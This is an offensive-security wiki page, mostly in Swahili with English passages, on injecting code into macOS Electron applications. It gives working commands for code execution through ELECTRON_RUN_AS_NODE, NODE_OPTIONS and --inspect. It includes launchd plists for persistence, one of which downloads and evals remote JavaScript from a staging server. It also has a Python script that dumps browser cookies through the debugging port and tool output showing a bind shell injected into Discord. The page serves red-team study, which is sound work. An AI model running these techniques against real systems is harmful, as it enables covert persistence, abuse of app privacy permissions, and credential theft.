# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Ikiwa hujui ni nini Electron, unaweza kupata [**habari nyingi hapa**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Lakini kwa sasa jua tu kwamba Electron inatumia **node**.\
Na node ina **parameta** na **env variables** ambazo zinaweza kutumika **kufanya itekeleze msimbo mwingine** mbali na faili iliyoonyeshwa.

### Electron Fuses

Mbinu hizi zitaelezewa baadaye, lakini katika nyakati za hivi karibuni Electron imeongeza **bendera za usalama kadhaa kuzuia hizo**. Hizi ni [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumika **kuzuia** programu za Electron katika macOS **kuchukua msimbo usio na mpangilio**:

* **`RunAsNode`**: Ikiwa imezimwa, inazuia matumizi ya env var **`ELECTRON_RUN_AS_NODE`** kuingiza msimbo.
* **`EnableNodeCliInspectArguments`**: Ikiwa imezimwa, parameta kama `--inspect`, `--inspect-brk` hazitazingatiwa. Inazuia njia hii kuingiza msimbo.
* **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewezeshwa, **`asar`** **faili** iliyopakiwa itathibitishwa na macOS. **Inazuia** njia hii **kuingiza msimbo** kwa kubadilisha maudhui ya faili hii.
* **`OnlyLoadAppFromAsar`**: Ikiwa hii imewezeshwa, badala ya kutafuta kupakia kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**. Itakagua tu na kutumia app.asar, hivyo kuhakikisha kwamba wakati **imeunganishwa** na **`embeddedAsarIntegrityValidation`** fuse haiwezekani **kuchukua msimbo usio thibitishwa**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewezeshwa, mchakato wa kivinjari unatumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa ajili ya snapshot yake ya V8.

Fuse nyingine ya kuvutia ambayo haitazuia kuingiza msimbo ni:

* **EnableCookieEncryption**: Ikiwa imewezeshwa, duka la kuki kwenye diski linachakatwa kwa kutumia funguo za cryptography za kiwango cha OS.

### Checking Electron Fuses

Unaweza **kuangalia bendera hizi** kutoka kwa programu kwa:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Kubadilisha Fuse za Electron

Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Fuse za Electron** umewekwa ndani ya **Electron binary** ambayo ina mahali fulani mfuatano wa herufi **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Katika programu za macOS hii kwa kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.

## RCE adding code to Electron Applications

There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.

{% hint style="danger" %}
However, at the moment there are 2 limitations:

* The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
* The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`

Making this attack path more complicated (or impossible).
{% endhint %}

Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.

You can unpack the code from the asar file with:
```bash
npx asar extract app.asar app-decomp
```
Na uifunge tena baada ya kuibadilisha kwa:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE na `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ikiwa hii variable ya mazingira imewekwa, itaanzisha mchakato kama mchakato wa kawaida wa Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`RunAsNode`** imezimwa, mabadiliko ya env **`ELECTRON_RUN_AS_NODE`** yataachwa bila kutumika, na hii haitafanya kazi.
{% endhint %}

### Uingizaji kutoka kwa App Plist

Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia mabadiliko haya ya env katika plist ili kudumisha uvumilivu:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE na `NODE_OPTIONS`

Unaweza kuhifadhi payload katika faili tofauti na kuitekeleza:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** ime **zimwa**, programu itakuwa **ipuuze** env var **NODE\_OPTIONS** inapozinduliwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itapuuziliwa mbali ikiwa fuse **`RunAsNode`** imezimwa.

Ikiwa hujaweka **`ELECTRON_RUN_AS_NODE`**, utaona **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Uingizaji kutoka kwa App Plist

Unaweza kutumia env variable hii katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE na ukaguzi

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ukitekeleza programu ya Electron kwa bendera kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ufuatiliaji itafunguliwa** ili uweze kuungana nayo (kwa mfano kutoka Chrome katika `chrome://inspect`) na utaweza **kuingiza msimbo ndani yake** au hata kuzindua michakato mipya.\
Kwa mfano: 

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`EnableNodeCliInspectArguments`** imezimwa, programu itakuwa **ikiweka kando vigezo vya node** (kama `--inspect`) inapozinduliwa isipokuwa variable ya env **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itakuwa **ikiwekwa kando** ikiwa fuse **`RunAsNode`** imezimwa.

Hata hivyo, unaweza bado kutumia **paramu ya electron `--remote-debugging-port=9229`** lakini payload ya awali haitafanya kazi kutekeleza michakato mingine.
{% endhint %}

Kwa kutumia paramu **`--remote-debugging-port=9222`** inawezekana kuiba baadhi ya taarifa kutoka kwa Programu ya Electron kama **historia** (kwa amri za GET) au **cookies** za kivinjari (kama zinavyokuwa **zimefichuliwa** ndani ya kivinjari na kuna **json endpoint** ambayo itawapa).

Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na kutumia chombo cha kiotomatiki [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Katika [**hiki blogu**](https://hackerone.com/reports/1274695), urekebishaji huu unatumika vibaya kufanya chrome isiyo na kichwa **kupakua faili zisizo na mpangilio katika maeneo yasiyo na mpangilio**.

### Uingizaji kutoka kwa App Plist

Unaweza kutumia vibaya hii env variable katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
Daemoni wa TCC kutoka macOS hauangalii toleo lililotekelezwa la programu. Hivyo kama huwezi **kuiingiza msimbo katika programu ya Electron** kwa kutumia mbinu zozote za awali unaweza kupakua toleo la awali la APP na kuingiza msimbo ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Trust Cache iizuie).
{% endhint %}

## Run non JS Code

Mbinu za awali zitakuruhusu kuendesha **msimbo wa JS ndani ya mchakato wa programu ya electron**. Hata hivyo, kumbuka kwamba **michakato ya watoto inakimbia chini ya wasifu sawa wa sandbox** kama programu ya mzazi na **inapata ruhusa zao za TCC**.\
Hivyo, ikiwa unataka kutumia haki za kuingia ili kufikia kamera au kipaza sauti kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwa mchakato**.

## Automatic Injection

Zana [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi ili **kupata programu za electron zenye udhaifu** zilizowekwa na kuingiza msimbo ndani yao. Zana hii itajaribu kutumia mbinu ya **`--inspect`**:

Unahitaji kuikamilisha mwenyewe na unaweza kuitumia kama hii:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Marejeo

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
